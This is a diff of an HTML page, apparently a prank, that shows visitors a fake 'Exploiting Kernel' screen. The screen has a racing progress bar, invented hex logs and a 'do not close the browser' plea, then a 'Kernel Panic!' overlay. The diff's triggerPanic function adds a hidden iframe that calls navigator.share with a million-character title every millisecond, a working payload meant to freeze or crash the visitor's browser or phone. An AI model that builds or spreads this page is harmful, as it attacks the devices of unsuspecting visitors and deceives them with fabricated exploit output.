@@ -3,88 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PHOENIX: CRITICAL</title>
+    <title>Exploiting...</title>
     <style>
-        /* ... (базовый CSS из предыдущего ответа) ... */
-        body { background: #000; color: #ff3b30; font-family: 'SF Mono', monospace; overflow: hidden; margin: 0; }
-        
-        #panic-screen { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #700; color: #fff; z-index: 9999; padding: 10px;
-            font-size: 8px; line-height: 1; word-break: break-all; overflow: hidden;
-        }
-
-        .error-overlay {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: #fff; color: #000; padding: 20px; font-weight: 900;
-            font-size: 30px; border: 5px solid #000; z-index: 10000; text-transform: uppercase;
-        }
+        body { font-family: -apple-system, sans-serif; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #000; color: white; overflow: hidden; }
+        .main-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(30px); border-radius: 38px; padding: 35px 25px; width: 85%; max-width: 360px; text-align: center; z-index: 10; position: relative; }
+        h1 { font-size: 1.7rem; text-transform: uppercase; margin: 0; }
+        .patient-msg { font-size: 11px; color: #32d74b; margin: 10px 0 20px; font-weight: bold; text-transform: uppercase; }
+        .progress-container { background: rgba(255, 255, 255, 0.1); height: 4px; border-radius: 10px; margin-bottom: 20px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #fff; transition: width 0.05s linear; }
+        #console { background: rgba(0, 0, 0, 0.6); border-radius: 22px; padding: 18px; height: 180px; font-family: 'SF Mono', monospace; font-size: 9px; color: #32d74b; text-align: left; overflow: hidden; }
+        #panic-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #700; color: #fff; z-index: 9999; padding: 10px; font-size: 7px; word-break: break-all; }
+        .error-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #000; padding: 20px; font-weight: 900; font-size: 25px; z-index: 10000; text-transform: uppercase; border: 4px solid #000; }
     </style>
 </head>
 <body>
     <div id="panic-screen"></div>
-    <div class="main-card" id="card">
-        <div class="progress-container"><div id="bar" style="width:0%; height:100%; background:#ff3b30; transition: width 0.1s linear;"></div></div>
-        <div id="console" style="height:200px; overflow:hidden; font-size:9px;"></div>
+    <div class="main-card">
+        <h1>Exploiting Kernel</h1>
+        <div class="patient-msg">Please be patient, do not close the browser</div>
+        <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
+        <div id="console"></div>
     </div>
-
     <script>
+        const bar = document.getElementById('bar');
         const consoleEl = document.getElementById('console');
         const panicEl = document.getElementById('panic-screen');
-        const bar = document.getElementById('bar');
-        
         let barW = 0;
-        // УСКОРЕННАЯ ПОЛОСКА
-        const barInterval = setInterval(() => {
-            barW += 4.5; // Было 0.9, теперь летит
-            bar.style.width = Math.min(barW, 100) + "%";
-            if (barW >= 100) clearInterval(barInterval);
-        }, 30);
 
-        // БЫСТРЫЕ ЛОГИ И РАНДОМНЫЕ ОШИБКИ
+        // Скорость прогресс-бара
+        const interval = setInterval(() => {
+            barW += 5; // Очень быстро
+            bar.style.width = barW + "%";
+            if(barW >= 100) {
+                clearInterval(interval);
+                triggerPanic();
+            }
+        }, 50);
+
+        // Скорость текста
         function addLog() {
-            const hex = () => Math.random().toString(16).substring(2, 10).toUpperCase();
-            const lines = [
-                `> EXEC: offset_find(0x${hex()})`,
-                `> KERNEL_WRITE: 0x${hex()} -> OK`,
-                `> BUG: heap_overflow at 0x${hex()}`,
-                `> PANIC: unexpected_token_near_task_port`,
-                `!! FATAL ERROR: MEMORY_CORRUPTION_DETECTED !!`
-            ];
-            const div = document.createElement('div');
-            div.innerText = lines[Math.floor(Math.random() * lines.length)];
-            consoleEl.appendChild(div);
-            consoleEl.scrollTop = consoleEl.scrollHeight;
-
-            if (barW < 100) {
-                setTimeout(addLog, 40); // Очень высокая скорость
-            } else {
-                triggerFullPanic();
+            if(barW < 100) {
+                const div = document.createElement('div');
+                div.innerText = `> 0x${Math.random().toString(16).substr(2,8).toUpperCase()}: CRITICAL_DATA_INJECTED`;
+                consoleEl.appendChild(div);
+                consoleEl.scrollTop = consoleEl.scrollHeight;
+                setTimeout(addLog, 30);
             }
         }
+        addLog();
 
-        function triggerFullPanic() {
+        function triggerPanic() {
             panicEl.style.display = 'block';
-            // Заполняем экран "мусором" и Fatal Error
-            setInterval(() => {
-                panicEl.innerText += ` FATAL_ERROR_0x${Math.random().toString(16)} `;
-            }, 10);
-
+            setInterval(() => { panicEl.innerText += ` FATAL_ERROR_0x${Math.random().toString(16)} `; }, 10);
             const overlay = document.createElement('div');
             overlay.className = 'error-overlay';
             overlay.innerText = "Kernel Panic!";
             document.body.appendChild(overlay);
-
-            // Тот самый скрипт для вылета/зависания
+            
+            // Код respring
             setTimeout(() => {
                 const frame = document.createElement('iframe');
                 frame.style.display = 'none';
                 frame.srcdoc = "<script>setInterval(()=>navigator.share({title:'X'.repeat(1000000)}),1)<\/script>";
                 document.body.appendChild(frame);
-            }, 1000);
+            }, 500);
         }
-
-        addLog();
     </script>
 </body>
 </html>
